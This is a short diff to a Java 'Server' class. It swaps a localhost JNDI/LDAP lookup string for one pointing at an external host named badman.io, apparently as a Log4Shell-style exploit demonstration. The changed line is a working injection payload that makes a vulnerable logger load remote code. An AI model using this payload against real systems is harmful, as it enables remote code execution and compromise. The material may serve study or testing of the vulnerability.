@@ -10,6 +10,6 @@ public class Server {
     }
 
     private static String getInput() {
-        return "${jndi:ldap://127.0.0.1:1389/Server}";
+        return "${jndi:ldap://badman.io/Exploit}";
     }
 }
